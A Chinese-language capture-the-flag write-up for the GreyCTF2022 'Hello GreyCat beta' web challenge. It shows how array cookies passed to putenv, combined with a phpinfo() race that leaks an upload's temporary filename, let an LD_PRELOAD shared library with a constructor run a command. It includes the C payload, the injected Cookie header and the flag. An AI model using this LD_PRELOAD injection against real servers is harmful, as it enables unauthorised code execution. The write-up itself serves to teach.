# GreyCTF2022 - Hello GreyCat beta

## 题目简述

Beta 直接从数组 Cookie 接收任意键值并调用 `putenv`，随后执行固定的 shell 命令。Alpha 的 Bash 函数覆盖不再可用，但站点暴露 `phpinfo()`；可以竞态读取上传临时文件名，再把恶意共享库路径写入 `LD_PRELOAD`，在新进程启动时执行构造函数。

## 解题过程

编译一个共享库，在 constructor 中清除 `LD_PRELOAD` 并执行目标命令：

```c
__attribute__((constructor)) static void run(void) {
    unsetenv("LD_PRELOAD");
    system("/readflag");
}
```

并发发送 multipart 上传请求和触发请求。上传尚未清理时，`/info.php` 的 `phpinfo()` 输出包含 `tmp_name => /tmp/phpXXXXXX`；立即再请求 `/hello.php`，设置数组 Cookie：

```http
Cookie: infos[LD_PRELOAD]=/tmp/phpXXXXXX
```

`system()` 启动 shell 时动态加载该临时文件，constructor 获得代码执行。官方还记录了更直接的非预期路径：把 `infos[name]` 设为 `/tmp/*`，固定命令中的 shell 通配符会回显所有临时文件名，可提高竞态成功率。最终得到：

```text
grey{3nv_v4r14bl3_15_5000000_d4n63r0u5_eeea3884e359995c}
```

## 方法总结

上传临时文件在请求结束前确实存在，信息泄露与环境注入可组合成 `LD_PRELOAD` 利用。竞态脚本应把“发现临时名”和“触发加载”分开并发执行，同时控制响应读取边界；这不是普通 LFI，而是临时文件生命周期与进程环境的组合问题。
